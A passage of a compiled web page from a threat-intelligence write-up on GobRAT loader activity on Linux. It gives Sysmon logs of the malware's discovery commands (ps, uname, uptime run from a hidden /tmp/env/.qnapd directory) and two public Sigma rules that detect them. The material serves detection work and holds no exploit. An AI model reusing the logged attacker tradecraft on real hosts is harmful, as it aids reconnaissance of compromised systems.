<Data Name="ProcessGuid">{46700b68-ff13-6475-f1bb-6c01f7550000}</Data>\n        <Data Name="ProcessId">26574</Data>\n        <Data Name="Image">/usr/bin/ps</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">ps -ef</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data>\n        <Data Name="ParentProcessId">26573</Data>\n        <Data Name="ParentImage">-</Data>\n        <Data Name="ParentCommandLine">-</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_process_discovery.yml"},"Public sigma")," rule that can help us to detect the use of ",(0,o.kt)("inlineCode",{parentName:"p"},"ps")," with information level."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Process Discovery\nid: 4e2f5868-08d4-413d-899f-dc2f1508627b\nstatus: stable\ndescription: |\n  Detects process discovery commands. Adversaries may attempt to get information about running processes on a system.\n  Information obtained could be used to gain an understanding of common software/applications running on systems within the network\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1057/T1057.md\nauthor: \xd6mer G\xfcnal, oscd.community\ndate: 2020/10/06\nmodified: 2022/07/07\ntags:\n    - attack.discovery\n    - attack.t1057\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith:\n            - '/ps'\n            - '/top'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activities\nlevel: informational\n")),(0,o.kt)("h3",{id:"system-information-discovery"},"System Information Discovery"),(0,o.kt)("p",null,"GobRAT Loaders execute multiple discovery commands during the infection. Just to mention a few of them, next two sysmon events are related to system information discovery."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16950</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff14-6475-0507-2fb57a550000}</Data>\n        <Data Name="ProcessId">26649</Data>\n        <Data Name="Image">/usr/bin/bash</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">/bin/bash -c uptime</Data>\n        <Data Name="CurrentDirectory">/tmp/env/.qnapd</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff13-6475-2f02-6b0100000000}</Data>\n        <Data Name="ParentProcessId">26638</Data>\n        <Data Name="ParentImage">/tmp/env/.qnapd/apached</Data>\n        <Data Name="ParentCommandLine">/tmp/env/.qnapd/apached</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16784</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff05-6475-81fa-b29af3550000}</Data>\n        <Data Name="ProcessId">26565</Data>\n        <Data Name="Image">/usr/bin/uname</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">uname -m</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff05-6475-f547-38be1a560000}</Data>\n        <Data Name="ParentProcessId">26546</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"For this behaviors, there is another public ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_system_info_discovery.yml"},"sigma rule")," to detect them."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: System Information Discovery\nid: 42df45e7-e6e9-43b5-8f26-bec5b39cc239\nstatus: stable\ndescription: Detects system information discovery commands\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md\nauthor: \xd6mer G\xfcnal, oscd.community\ndate: 2020/10/08\nmodified: 2021/09/14\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith:\n            - '/uname'\n            - '/hostname'\n            - '/uptime'\n            - '/lspci'\n            - '/dmidecode'\n            - '/lscpu'\n            - '/lsmod'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activities\nlevel: informational\n")),(0,o.kt)("h2",{id:"conclusions"},"Conclusions"),(0,o.kt)("p",null,"Although the campaign was initially aimed at routers, as we have seen, the behaviors are very generic and linux endpoints could be targeted, where in fact some of the analyzed behaviors have already been used previously by other threat actors."),(0,o.kt)("p",null,"This is an approach on how from a CTI point of view where new trends, campaigns and malware are analyzed, it can lead to the generation of new threats."),(0,o.kt)("p",null,"All the sigma rules created by myself are pushed to the official repo."),(0,o.kt)("h2",{id:"contact"},"Contact"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Twitter"),": ",(0,o.kt)("a",{parentName:"p",href:"https://twitter.com/Joseliyo_Jstnk"},"https://twitter.com/Joseliyo_Jstnk")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"LinkedIn"),": ",(0,o.kt)("a",{parentName:"p",href:"https://www.linkedin.com/in/joseluissm/"},"https://www.linkedin.com/in/joseluissm/")))}D.isMDXComponent=!0}}]);